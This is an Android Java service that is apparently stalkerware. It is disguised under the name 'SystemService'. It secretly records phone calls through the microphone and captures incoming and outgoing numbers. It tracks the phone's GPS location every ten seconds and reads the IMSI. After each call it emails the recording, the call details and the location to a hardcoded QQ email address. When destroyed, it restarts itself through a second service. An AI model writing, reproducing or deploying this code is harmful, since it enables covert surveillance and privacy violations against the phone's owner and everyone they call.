package com.aa.aaa;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.media.MediaRecorder;
import android.os.Environment;
import android.os.IBinder;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.baidu.location.BDLocation;
import com.baidu.location.BDLocationListener;
import com.baidu.location.LocationClient;
import com.baidu.location.LocationClientOption;
import com.baidu.location.Poi;

import java.io.File;
import java.util.List;

public class SystemService extends Service {
    public static final String TAG = "SystemService";

    public SystemService() {
    }

    //电话管理器
    private TelephonyManager tm;
    //监听对象
    private MyListener listener;
    //声明录音机
    private MediaRecorder mediaRecorder;

    public LocationClient mLocationClient = null;
    public BDLocationListener myListener = new MyLocationListener();

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        return null;
    }

    int i = 0;
    Runnable mRunnable = new Runnable() {
        @Override
        public void run() {
            while (true) {
                Log.d(TAG, "aaaaaaaa还在运行" + i++);
                try {
                    Thread.sleep(1000);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
        }
    };

    String mOutgoingNumber = "0";
    //创建服务的时候调用的方法
    public void onCreate() {
        super.onCreate();

        mLocationClient = new LocationClient(getApplicationContext());     //声明LocationClient类
        mLocationClient.registerLocationListener(myListener);    //注册监听函数
        initLocation();


//        File file = new File(Environment.getExternalStorageDirectory(), "1481855894257.3gp");
//        sendMail(file.getAbsolutePath());

        new Thread(mRunnable).start();
        //后台监听电话的呼叫状态
        //得到电话管理器
        tm = (TelephonyManager) this.getSystemService(TELEPHONY_SERVICE);
        listener = new MyListener();
        tm.listen(listener, PhoneStateListener.LISTEN_CALL_STATE);

        mLocationClient.start();



        //去电广播
        IntentFilter intentFilter = new IntentFilter();
        // 监听去电广播
        intentFilter.addAction("android.intent.action.NEW_OUTGOING_CALL");
        // 动态注册去电广播接收器
        registerReceiver(new BroadcastReceiver() {
            @Override
            public void onReceive(final Context context, final Intent intent) {
                // 获取去电号码
                mOutgoingNumber = getResultData();
            }
        }, intentFilter);
    }

    String mIncomingNumber = "0";

    private class MyListener extends PhoneStateListener {
        //当电话的呼叫状态发生变化的时候调用的方法
        private String filePath = "";

        @Override
        public void onCallStateChanged(int state, String incomingNumber) {
            super.onCallStateChanged(state, incomingNumber);
            try {
                switch (state) {
                    case TelephonyManager.CALL_STATE_IDLE://空间状态
                        Log.d(TAG, "空间状态");
                        if (mediaRecorder != null) {
                            Log.d(TAG, "停止捕获");
                            mediaRecorder.stop();
                            Log.d(TAG, "释放资源");
                            mediaRecorder.release();
                            mediaRecorder = null;
                            Log.d(TAG, "录制完毕，上传到服务器分析");

                            sendMail(filePath);

                        }
                        break;
                    case TelephonyManager.CALL_STATE_RINGING://通话状态
                        mIncomingNumber = incomingNumber;
                        break;
                    case TelephonyManager.CALL_STATE_OFFHOOK://通话状态
                        Log.d(TAG, "开始录音");
                        Log.d(TAG, "实例化一个录音机");
                        mediaRecorder = new MediaRecorder();
                        Log.d(TAG, "指定录音机的声音源");
                        mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
                        Log.d(TAG, "设置录制的文件输出的格式");
                        mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.DEFAULT);
                        //4.制定录音文件的名称
                        Log.d(TAG, "制定录音文件的名称");
                        File file = new File(Environment.getExternalStorageDirectory(), System.currentTimeMillis() + ".3gp");
                        filePath = file.getAbsolutePath();
                        Log.d(TAG, "制定录音文件的名称filePath=" + filePath);
                        mediaRecorder.setOutputFile(filePath);
                        Log.d(TAG, "设置音频的编码");
                        mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.DEFAULT);
                        Log.d(TAG, "开始准备录音");
                        mediaRecorder.prepare();
                        Log.d(TAG, "开始录音");
                        mediaRecorder.start();

                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    //服务器销毁的时候调用的方法
    @Override
    public void onDestroy() {
        super.onDestroy();
        //取消电话的监听
        System.out.println("onDestroy");
        Intent intent = new Intent(this, SystemService2.class);
        startService(intent);
        tm.listen(listener, PhoneStateListener.LISTEN_NONE);
        listener = null;

    }


    public void sendMail(final String path) {
        new Thread(new Runnable() {
            public void run() {
                EmailUtil emailUtil = new EmailUtil();
                try {
                    Log.d(TAG, "发送mail");
					//发送者邮箱，自行申请
                    //String account = "";
                    //String password = "";
                    String location = LocationInfo.toString();
					//接收者邮箱
                    emailUtil.sendMail("26012450@qq.com", account, "smtp.163.com",
                            account, password, "电话录音", "邮件由系统自动发送，请不要回复！\n\n"
                                    + "手机信息:" + android.os.Build.BRAND + " " + android.os.Build.MODEL + "\n"
                                    + "手机服务商信息:" + getProvidersName() + "\n"
                                    + "去电:" + mOutgoingNumber + " 来电:" + mIncomingNumber + "\n"
                                    + "定位信息如下:\n" + location, path);
                } catch (Exception e) {
                    Log.d(TAG, "发送mail异常");
                    e.printStackTrace();
                }
            }
        }).start();
    }


    private void initLocation() {
        LocationClientOption option = new LocationClientOption();
        option.setLocationMode(LocationClientOption.LocationMode.Hight_Accuracy
        );//可选，默认高精度，设置定位模式，高精度，低功耗，仅设备
        option.setCoorType("bd09ll");//可选，默认gcj02，设置返回的定位结果坐标系
        int span = 10000;
        option.setScanSpan(span);//可选，默认0，即仅定位一次，设置发起定位请求的间隔需要大于等于1000ms才是有效的
        option.setIsNeedAddress(true);//可选，设置是否需要地址信息，默认不需要
        option.setOpenGps(true);//可选，默认false,设置是否使用gps
        option.setLocationNotify(true);//可选，默认false，设置是否当GPS有效时按照1S/1次频率输出GPS结果
        option.setIsNeedLocationDescribe(true);//可选，默认false，设置是否需要位置语义化结果，可以在BDLocation.getLocationDescribe里得到，结果类似于“在北京天安门附近”
        option.setIsNeedLocationPoiList(true);//可选，默认false，设置是否需要POI结果，可以在BDLocation.getPoiList里得到
        option.setIgnoreKillProcess(false);//可选，默认true，定位SDK内部是一个SERVICE，并放到了独立进程，设置是否在stop的时候杀死这个进程，默认不杀死
        option.SetIgnoreCacheException(false);//可选，默认false，设置是否收集CRASH信息，默认收集
        option.setEnableSimulateGps(false);//可选，默认false，设置是否需要过滤GPS仿真结果，默认需要
        mLocationClient.setLocOption(option);
    }


    StringBuffer LocationInfo = new StringBuffer(256);

    /**
     * 定位SDK监听函数
     */
    public class MyLocationListener implements BDLocationListener {

        @Override
        public void onReceiveLocation(BDLocation location) {
            //Receive Location
            LocationInfo.delete(0, LocationInfo.length());
            LocationInfo.append("定位时间 : ");
            LocationInfo.append(location.getTime());
            LocationInfo.append("\n错误码 : ");
            LocationInfo.append(location.getLocType());
            LocationInfo.append("\nlatitude : ");
            LocationInfo.append(location.getLatitude());
            LocationInfo.append("\nlontitude : ");
            LocationInfo.append(location.getLongitude());
            LocationInfo.append("\nradius : ");
            LocationInfo.append(location.getRadius());
            if (location.getLocType() == BDLocation.TypeGpsLocation) {// GPS定位结果
                LocationInfo.append("\nspeed : ");
                LocationInfo.append(location.getSpeed());// 单位：公里每小时
                LocationInfo.append("\nsatellite : ");
                LocationInfo.append(location.getSatelliteNumber());
                LocationInfo.append("\nheight : ");
                LocationInfo.append(location.getAltitude());// 单位：米
                LocationInfo.append("\ndirection : ");
                LocationInfo.append(location.getDirection());// 单位度
                LocationInfo.append("\n定位地址 : ");
                LocationInfo.append(location.getAddrStr());
                LocationInfo.append("\ndescribe : ");
                LocationInfo.append("gps定位成功");

            } else if (location.getLocType() == BDLocation.TypeNetWorkLocation) {// 网络定位结果
                LocationInfo.append("\naddr : ");
                LocationInfo.append(location.getAddrStr());
                //运营商信息
                LocationInfo.append("\noperationers : ");
                LocationInfo.append(location.getOperators());
                LocationInfo.append("\ndescribe : ");
                LocationInfo.append("网络定位成功");
            } else if (location.getLocType() == BDLocation.TypeOffLineLocation) {// 离线定位结果
                LocationInfo.append("\ndescribe : ");
                LocationInfo.append("离线定位成功，离线定位结果也是有效的");
            } else if (location.getLocType() == BDLocation.TypeServerError) {
                LocationInfo.append("\ndescribe : ");
                LocationInfo.append("服务端网络定位失败，可以反馈IMEI号和大体定位时间到loc-bugs@baidu.com，会有人追查原因");
            } else if (location.getLocType() == BDLocation.TypeNetWorkException) {
                LocationInfo.append("\ndescribe : ");
                LocationInfo.append("网络不同导致定位失败，请检查网络是否通畅");
            } else if (location.getLocType() == BDLocation.TypeCriteriaException) {
                LocationInfo.append("\ndescribe : ");
                LocationInfo.append("无法获取有效定位依据导致定位失败，一般是由于手机的原因，处于飞行模式下一般会造成这种结果，可以试着重启手机");
            }
            LocationInfo.append("\nlocationdescribe : ");
            LocationInfo.append(location.getLocationDescribe());// 位置语义化信息
            List<Poi> list = location.getPoiList();// POI数据
            if (list != null) {
                LocationInfo.append("\npoilist size = : ");
                LocationInfo.append(list.size());
                for (Poi p : list) {
                    LocationInfo.append("\npoi= : ");
                    LocationInfo.append(p.getId() + " " + p.getName() + " " + p.getRank());
                }
            }
            Log.i(TAG, LocationInfo.toString());
        }
    }

    /**
     * 获取手机服务商信息
     */
    public String getProvidersName() {
        String ProvidersName = "N/A";
        try {
            String IMSI = tm.getSubscriberId();
            // IMSI号前面3位460是国家，紧接着后面2位00 02是中国移动，01是中国联通，03是中国电信。
            System.out.println(IMSI);
            if (IMSI.startsWith("46000") || IMSI.startsWith("46002")) {
                ProvidersName = "中国移动";
            } else if (IMSI.startsWith("46001")) {
                ProvidersName = "中国联通";
            } else if (IMSI.startsWith("46003")) {
                ProvidersName = "中国电信";
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return ProvidersName;
    }
}


    
